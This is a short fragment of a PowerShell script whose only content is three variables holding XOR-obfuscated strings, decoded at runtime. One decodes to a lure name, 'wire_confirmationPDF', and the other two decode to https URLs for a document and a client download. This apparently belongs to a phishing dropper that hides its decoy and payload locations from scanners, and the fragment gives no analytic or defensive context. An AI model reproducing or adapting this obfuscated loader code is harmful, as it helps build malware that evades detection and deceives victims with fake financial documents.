...
$ClientName     = $($k1942=35;$b=[byte[]](0x54,0x4A,0x51,0x46,0x7C,0x40,0x4C,0x4D,0x45,0x4A,0x51,0x4E,0x42,0x57,0x4A,0x4C,0x4D,0x73,0x67,0x65);-join($b|%{[char]($_ -bxor$k1942)}))
$DocumentURL    = $($k2994='4N*$SPa7';$b=[byte[]](0x5C,0x3A,0x5E,0x54,0x20,0x6A,0x4E,0x18,0x46,0x2F,0x5D,0x0A,0x34,0x39,0x15,0x5F,0x41,0x2C,0x5F,0x57,0x36,0x22,0x02,0x58,0x5A,0x3A,0x4F,0x4A,0x27,0x7E,0x02,0x58,0x59,0x61,0x59,0x50,0x3C,0x33,0x0A,0x5B,0x51,0x37,0x1B,0x16,0x7C,0x27,0x08,0x45,0x51,0x63,0x4E,0x4B,0x30,0x23,0x4E,0x5A,0x55,0x27,0x44,0x0B,0x24,0x39,0x13,0x52,0x6B,0x2D,0x45,0x4A,0x35,0x39,0x13,0x5A,0x55,0x3A,0x43,0x4B,0x3D,0x7E,0x11,0x53,0x52);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2994);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
$ClientURL      = $($k9179='9cn8*%knpO';$b=[byte[]](0x51,0x17,0x1A,0x48,0x10,0x0A,0x44,0x19,0x07,0x38,0x17,0x07,0x0F,0x4B,0x42,0x47,0x04,0x0F,0x02,0x2B,0x56,0x0D,0x1E,0x59,0x5A,0x40,0x19,0x1D,0x15,0x2C,0x17,0x17,0x01,0x48,0x05,0x67,0x02,0x00,0x5F,0x1C,0x5A,0x11,0x0B,0x5D,0x44,0x66,0x04,0x00,0x1E,0x2A,0x5A,0x17,0x40,0x7B,0x46,0x4C,0x0E,0x00,0x04,0x1C,0x5C,0x17,0x1B,0x48,0x04,0x48,0x18,0x07,0x4F,0x2A,0x04,0x22,0x0D,0x5B,0x4F,0x56,0x18,0x48,0x09,0x72,0x7E,0x16,0x0B,0x4B,0x5E);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9179);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
